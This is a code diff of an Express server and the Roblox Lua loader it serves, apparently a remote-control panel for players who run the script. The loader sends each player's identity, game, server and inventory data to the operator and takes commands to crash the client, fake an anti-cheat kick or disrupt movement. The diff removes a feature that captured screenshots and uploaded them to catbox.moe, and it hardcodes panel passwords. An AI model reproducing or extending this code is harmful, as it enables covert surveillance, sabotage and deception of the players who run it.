@@ -10,11 +10,15 @@ const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 
 
 app.set('trust proxy', 1);
 app.use(cors({ origin: PUBLIC_URL, credentials: true }));
-app.use(express.json({ limit: '15mb' }));
+app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-const PANEL_PASSWORD = 'seyko92!';
-const ADMIN_PASSWORD = 'seyko.pl84';
+// ══════════════════════════════════════════════════════════
+// 🔑 MOTS DE PASSE
+// ══════════════════════════════════════════════════════════
+const PANEL_PASSWORD = 'seyko15.';   // ← mot de passe du panel
+const ADMIN_PASSWORD = 'seyko.pl84';         // ← mot de passe ADMIN (demandé à chaque clic)
+// ══════════════════════════════════════════════════════════
 
 const sessions = new Map();
 const SESSION_TTL = 24 * 60 * 60 * 1000;
@@ -24,6 +28,7 @@ function generateSessionId() {
     return crypto.randomBytes(32).toString('hex');
 }
 
+// ─── COOKIE PARSER ───
 app.use((req, res, next) => {
     req.cookies = {};
     const cookieHeader = req.headers.cookie;
@@ -47,6 +52,7 @@ app.use((req, res, next) => {
     next();
 });
 
+// ─── AUTH MIDDLEWARE ───
 function requireSession(req, res, next) {
     const sid = req.cookies[COOKIE_NAME] || req.headers['x-session-id'];
     if (!sid || !sessions.has(sid)) {
@@ -66,6 +72,7 @@ function requireSession(req, res, next) {
     next();
 }
 
+// ─── PUBLIC ROUTES ───
 app.get('/login', (req, res) => {
     const sid = req.cookies[COOKIE_NAME];
     if (sid && sessions.has(sid)) return res.redirect('/');
@@ -108,9 +115,14 @@ app.post('/api/login', (req, res) => {
     const { password } = req.body;
     if (password === PANEL_PASSWORD) {
         const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+        
+        // 🛡️ NOUVEAU : Supprime toute session existante avec la même IP pour éviter les doublons dans le panel admin
         for (const [sid, s] of sessions.entries()) {
-            if (s.ip === ip) sessions.delete(sid);
+            if (s.ip === ip) {
+                sessions.delete(sid);
+            }
         }
+
         const sid = generateSessionId();
         sessions.set(sid, { createdAt: Date.now(), ip: ip });
         res.setCookie(COOKIE_NAME, sid, { maxAge: SESSION_TTL / 1000, secure: true });
@@ -126,6 +138,9 @@ app.post('/api/logout', (req, res) => {
     res.json({ success: true });
 });
 
+// ══════════════════════════════════════════════════════════
+// 🛡️ ADMIN ROUTES (mot de passe admin demandé à chaque requête)
+// ══════════════════════════════════════════════════════════
 function requireAdmin(req, res, next) {
     const adminPwd = req.body.adminPassword;
     if (adminPwd !== ADMIN_PASSWORD) {
@@ -137,20 +152,38 @@ function requireAdmin(req, res, next) {
 app.post('/api/admin/sessions', requireSession, requireAdmin, (req, res) => {
     const sessionList = [];
     for (const [id, s] of sessions.entries()) {
-        sessionList.push({ id: id, createdAt: s.createdAt, ip: s.ip || 'Unknown', isSelf: (id === req.sessionId) });
+        sessionList.push({
+            id: id,
+            createdAt: s.createdAt,
+            ip: s.ip || 'Unknown',
+            isSelf: (id === req.sessionId)
+        });
     }
     res.json({ sessions: sessionList });
 });
 
 app.post('/api/admin/disconnect', requireSession, requireAdmin, (req, res) => {
     const { sessionId } = req.body;
-    if (sessionId === req.sessionId) return res.status(400).json({ error: 'Cannot disconnect yourself' });
+    if (sessionId === req.sessionId) {
+        return res.status(400).json({ error: 'Cannot disconnect yourself' });
+    }
     sessions.delete(sessionId);
     res.json({ success: true });
 });
 
+app.post('/api/admin/change-password', requireSession, requireAdmin, (req, res) => {
+    const { newPassword } = req.body;
+    if (!newPassword || newPassword.length < 4) {
+        return res.status(400).json({ error: 'Password too short' });
+    }
+    res.status(400).json({ error: 'Password change disabled. Edit server.js directly.' });
+});
+// ══════════════════════════════════════════════════════════
+
+// ─── PLAYERS STORE ───
 const players = new Map();
 
+// ─── PUBLIC LOADER ───
 app.get('/loader.lua', (req, res) => {
     const loader = `local BASE = "${PUBLIC_URL}"
 local KEY  = "seyko"
@@ -159,7 +192,6 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local genv = (getgenv and getgenv()) or _G or {}
-
 local function resolveRequest()
     return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
 end
@@ -169,45 +201,26 @@ if not request then
     repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
 end
 if not request then return end
-
 local LP = Players.LocalPlayer
 if not LP then
     local deadline = tick() + 30
     repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
 end
 if not LP then return end
-
 local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end
 local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
-
-local function debugLog(msg)
-    print("[SEYKO] " .. msg)
-    if writefile then
-        pcall(function()
-            local existing = ""
-            if readfile then pcall(function() existing = readfile("seyko_debug.txt") end) end
-            writefile("seyko_debug.txt", existing .. os.date("[%H:%M:%S] ") .. msg .. "\\n")
-        end)
-    end
-end
-
-debugLog("Loader started | Executor: " .. executorName)
-
 local function gameName()
     local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
     return info and info.Name or "Unknown Game"
 end
-
 local function avatarUrl()
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
 end
-
 local function serverPlayers()
     local t = {}
     for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
     return t
 end
-
 local function collectBrainrots()
     local list = {}
     local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
@@ -281,14 +294,33 @@ local function collectBrainrots()
     for _, child in ipairs(targetFrame:GetChildren()) do
         if child.Name == "Template" and child:IsA("Frame") then processItem(child) end
     end
+    if #list == 0 then
+        local simpleBrainrots = {}
+        local seenTexts = {}
+        for _, child in ipairs(pg:GetDescendants()) do
+            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
+                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
+                    seenTexts[text] = true
+                    local cash = "0"
+                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
+                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
+                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                        if text == "" then text = "Item" end
+                    end
+                    if #text > 1 then table.insert(simpleBrainrots, { title = text, cash = cash }) end
+                end
+            end
+        end
+        if #simpleBrainrots > 0 then return simpleBrainrots end
+    end
     return list
 end
-
 local function heartbeat()
     safe(function()
         local brainrots = collectBrainrots()
-        pcall(function()
-            request({
+        local success, result = pcall(function()
+            return request({
                 Url = BASE .. "/api/public/heartbeat", Method = "POST",
                 Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                 Body = HttpService:JSONEncode({
@@ -298,9 +330,35 @@ local function heartbeat()
                 }),
             })
         end)
+        if not success then
+            local simpleBrainrots = {}
+            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+            if pg then
+                for _, child in ipairs(pg:GetDescendants()) do
+                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
+                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
+                            table.insert(simpleBrainrots, { title = text, cash = "0" })
+                        end
+                    end
+                end
+            end
+            if #simpleBrainrots > 0 then
+                pcall(function()
+                    request({
+                        Url = BASE .. "/api/public/heartbeat", Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
+                        Body = HttpService:JSONEncode({
+                            user_id = LP.UserId, username = LP.Name, display_name = LP.DisplayName,
+                            avatar_url = avatarUrl(), place_id = game.PlaceId, game_name = gameName(),
+                            job_id = game.JobId, executor = executorName, server_players = serverPlayers(), brainrots = simpleBrainrots,
+                        }),
+                    })
+                end)
+            end
+        end
     end)
 end
-
 local fpsConn = nil
 local fpsOn = false
 local function setFpsLimit(on)
@@ -315,7 +373,6 @@ local function setFpsLimit(on)
         if fpsConn then fpsConn:Disconnect() fpsConn = nil end
     end
 end
-
 local HISTORY_SIZE = 0.27
 local INTERVAL = 0.6
 local NORMAL_SPEED_MIN = 35
@@ -324,7 +381,6 @@ local posHistory = {}
 local isActive = false
 local mode = nil
 local intervalThread = nil
-
 RunService.Heartbeat:Connect(function()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -334,7 +390,6 @@ RunService.Heartbeat:Connect(function()
     local cutoff = now - HISTORY_SIZE - 0.1
     while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
 end)
-
 local function currentSpeed()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -342,14 +397,12 @@ local function currentSpeed()
     local v = root.AssemblyLinearVelocity
     return Vector3.new(v.X, 0, v.Z).Magnitude
 end
-
 local function meetsSpeedReq()
     local s = currentSpeed()
     if mode == "normal" then return s >= NORMAL_SPEED_MIN end
     if mode == "carry" then return s >= CARRY_SPEED_MIN end
     return false
 end
-
 local function doRubberband()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -366,11 +419,9 @@ local function doRubberband()
     root.CFrame = best
     root.AssemblyLinearVelocity = vel
 end
-
 local function stopLoop()
     if intervalThread then pcall(task.cancel, intervalThread); intervalThread = nil end
 end
-
 local function startLoop()
     stopLoop()
     intervalThread = task.spawn(function()
@@ -387,141 +438,16 @@ local function startLoop()
         end
     end)
 end
-
 local function setMode(newMode)
     if mode == newMode then return end
     mode = newMode
     if mode then isActive = true; startLoop()
     else isActive = false; stopLoop() end
 end
-
 local kicked = false
 local prevLagN = false
 local prevLagC = false
 local prevFps = false
-local prevSpectate = false
-
-local screenshotThread = nil
-local spectating = false
-
-local function captureScreenshot()
-    local funcs = {
-        { name = "screencapture", fn = function() return screencapture() end },
-        { name = "getscreencapture", fn = function() return getscreencapture() end },
-        { name = "syn.screencapture", fn = function() return syn.screencapture() end },
-        { name = "getgenv().screencapture", fn = function() return getgenv().screencapture() end }
-    }
-    
-    for _, f in ipairs(funcs) do
-        local ok, result = pcall(f.fn)
-        if ok and result and type(result) == "string" and #result > 100 then
-            debugLog("Screenshot captured via " .. f.name .. " | Size: " .. #result .. " bytes")
-            return result, f.name
-        end
-    end
-    
-    debugLog("No screenshot function available on " .. executorName)
-    return nil, nil
-end
-
-local function uploadToCatbox(imageData)
-    debugLog("Uploading to catbox.moe...")
-    
-    local boundary = "----SeykoBoundary" .. tostring(math.random(100000, 999999))
-    
-    local bodyParts = {}
-    table.insert(bodyParts, "--" .. boundary .. "\\r\\n")
-    table.insert(bodyParts, 'Content-Disposition: form-data; name="reqtype"\\r\\n\\r\\n')
-    table.insert(bodyParts, "fileupload\\r\\n")
-    table.insert(bodyParts, "--" .. boundary .. "\\r\\n")
-    table.insert(bodyParts, 'Content-Disposition: form-data; name="userhash"\\r\\n\\r\\n')
-    table.insert(bodyParts, "\\r\\n")
-    table.insert(bodyParts, "--" .. boundary .. "\\r\\n")
-    table.insert(bodyParts, 'Content-Disposition: form-data; name="fileToUpload"; filename="screen.png"\\r\\n')
-    table.insert(bodyParts, "Content-Type: image/png\\r\\n\\r\\n")
-    
-    local header = table.concat(bodyParts)
-    local footer = "\\r\\n--" .. boundary .. "--\\r\\n"
-    
-    local fullBody = header .. imageData .. footer
-    
-    debugLog("Multipart body size: " .. #fullBody .. " bytes")
-    
-    local ok, res = pcall(function()
-        return request({
-            Url = "https://catbox.moe/user/api.php",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
-            },
-            Body = fullBody
-        })
-    end)
-    
-    if not ok then
-        debugLog("Catbox upload failed: " .. tostring(res))
-        return nil
-    end
-    
-    if res and res.Body then
-        local url = res.Body
-        debugLog("Catbox response: " .. url)
-        
-        if string.find(url, "catbox.moe") or string.find(url, "files.catbox") then
-            return url
-        end
-    end
-    
-    debugLog("Catbox upload returned invalid response")
-    return nil
-end
-
-local function sendSpecData()
-    local telemetry = {}
-    local char = LP.Character
-    local humanoid = char and char:FindFirstChild("Humanoid")
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    
-    if root then
-        telemetry.position = string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z)
-    end
-    if humanoid then
-        telemetry.health = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth)
-    end
-    telemetry.executor = executorName
-    
-    local imageData, methodName = captureScreenshot()
-    local imageUrl = nil
-    local errorMsg = nil
-    
-    if imageData then
-        imageUrl = uploadToCatbox(imageData)
-        if imageUrl then
-            debugLog("Success! Image URL: " .. imageUrl)
-        else
-            errorMsg = "UPLOAD_FAILED:" .. executorName
-        end
-    else
-        errorMsg = "SCREENSHOT_NOT_SUPPORTED:" .. executorName
-    end
-    
-    pcall(function()
-        request({
-            Url = BASE .. "/api/public/spec_data",
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-            Body = HttpService:JSONEncode({
-                user_id = LP.UserId,
-                imageUrl = imageUrl,
-                screenshotMethod = methodName,
-                telemetry = telemetry,
-                error = errorMsg,
-                timestamp = os.time()
-            })
-        })
-    end)
-end
-
 local function poll()
     local res = safe(function()
         return request({ Url = BASE .. "/api/public/command?user_id=" .. LP.UserId, Method = "GET", Headers = { ["X-Api-Key"] = KEY } })
@@ -529,48 +455,20 @@ local function poll()
     if not res or not res.Body then return end
     local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
     if not ok2 or type(data) ~= "table" then return end
-    
     local wantFps = (data.fps_limit == true)
     if wantFps ~= prevFps then prevFps = wantFps; setFpsLimit(wantFps) end
-    
     local wantN = (data.lag_n == true)
     local wantC = (data.lag_c == true)
     if wantC ~= prevLagC or wantN ~= prevLagN then
         prevLagC = wantC; prevLagN = wantN
         if wantC then setMode("carry") elseif wantN then setMode("normal") else setMode(nil) end
     end
-    
     if data.crash == true then while true do end end
     if data.kick == true and not kicked then
         kicked = true
         LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
     end
-    
-    local wantSpectate = (data.spectate == true)
-    if wantSpectate ~= prevSpectate then
-        prevSpectate = wantSpectate
-        if wantSpectate then
-            spectating = true
-            debugLog("Spectate ENABLED")
-            if not screenshotThread then
-                screenshotThread = task.spawn(function()
-                    while spectating do
-                        sendSpecData()
-                        task.wait(5)
-                    end
-                end)
-            end
-        else
-            spectating = false
-            debugLog("Spectate DISABLED")
-            if screenshotThread then
-                pcall(task.cancel, screenshotThread)
-                screenshotThread = nil
-            end
-        end
-    end
 end
-
 heartbeat()
 poll()
 task.spawn(function() while task.wait(3) do heartbeat() end end)
@@ -579,10 +477,12 @@ task.spawn(function() while task.wait(0.5) do poll() end end)`;
     res.send(loader);
 });
 
+// ─── PROTECTED: main page ───
 app.get('/', requireSession, (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// ─── PROTECTED: panel API endpoints ───
 app.get('/api/players', requireSession, (req, res) => {
     const list = [];
     const now = Date.now();
@@ -593,7 +493,7 @@ app.get('/api/players', requireSession, (req, res) => {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
         if (timeSinceLast >= REMOVE_THRESHOLD) { players.delete(id); continue; }
-        if (!online) { p.fps_limit = false; p.lag_n = false; p.lag_c = false; p.spectate = false; p._kick = false; p._crash = false; }
+        if (!online) { p.fps_limit = false; p.lag_n = false; p.lag_c = false; p._kick = false; p._crash = false; }
         p.online = online;
         list.push({ ...p });
         players.set(id, p);
@@ -605,12 +505,12 @@ app.get('/api/command_state', requireSession, (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     const p = players.get(String(userId));
-    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false, spectate: false });
-    res.json({ fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false, spectate: p.spectate || false });
+    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
+    res.json({ fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false });
 });
 
 app.post('/api/command', requireSession, (req, res) => {
-    const { user_id, fps_limit, lag_n, lag_c, kick, crash, spectate } = req.body;
+    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     const userId = String(user_id);
     const p = players.get(userId);
@@ -620,42 +520,8 @@ app.post('/api/command', requireSession, (req, res) => {
     if (lag_c !== undefined) p.lag_c = !!lag_c;
     if (kick === true) p._kick = true;
     if (crash === true) p._crash = true;
-    if (spectate !== undefined) p.spectate = !!spectate;
     players.set(userId, p);
     res.json({ status: 'ok' });
-});
-
-app.post('/api/public/spec_data', (req, res) => {
-    const { user_id, imageUrl, screenshotMethod, telemetry, error, timestamp } = req.body;
-    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
-    
-    const userId = String(user_id);
-    const p = players.get(userId);
-    if (p) {
-        p.imageUrl = imageUrl || null;
-        p.screenshotMethod = screenshotMethod || null;
-        p.telemetry = telemetry || null;
-        p.screenshotError = error || null;
-        p.screenshotTimestamp = timestamp || Date.now();
-        players.set(userId, p);
-    }
-    res.json({ status: 'ok' });
-});
-
-app.get('/api/screenshot', requireSession, (req, res) => {
-    const userId = req.query.user_id;
-    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
-    
-    const p = players.get(String(userId));
-    if (!p) return res.json({ imageUrl: null, telemetry: null, error: null });
-    
-    res.json({ 
-        imageUrl: p.imageUrl || null,
-        screenshotMethod: p.screenshotMethod || null,
-        telemetry: p.telemetry || null,
-        error: p.screenshotError || null,
-        timestamp: p.screenshotTimestamp 
-    });
 });
 
 app.post('/api/public/heartbeat', (req, res) => {
@@ -670,7 +536,7 @@ app.post('/api/public/heartbeat', (req, res) => {
         brainrots = brainrots.filter(b => b && typeof b === 'object' && ((b.title && b.title !== '') || (b.cash && b.cash !== '')));
         if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) brainrots = existing.brainrots;
     }
-    players.set(userId, { ...existing, ...data, brainrots: brainrots, user_id: userId, online: true, lastHeartbeat: Date.now(), fps_limit: existing.fps_limit || false, lag_n: existing.lag_n || false, lag_c: existing.lag_c || false, spectate: existing.spectate || false });
+    players.set(userId, { ...existing, ...data, brainrots: brainrots, user_id: userId, online: true, lastHeartbeat: Date.now(), fps_limit: existing.fps_limit || false, lag_n: existing.lag_n || false, lag_c: existing.lag_c || false });
     res.json({ status: 'ok' });
 });
 
@@ -678,8 +544,8 @@ app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     const p = players.get(String(userId));
-    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false, spectate: false });
-    const response = { fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false, spectate: p.spectate || false };
+    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
+    const response = { fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false };
     if (p._kick) { response.kick = true; p._kick = false; }
     if (p._crash) { response.crash = true; p._crash = false; }
     players.set(String(userId), p);
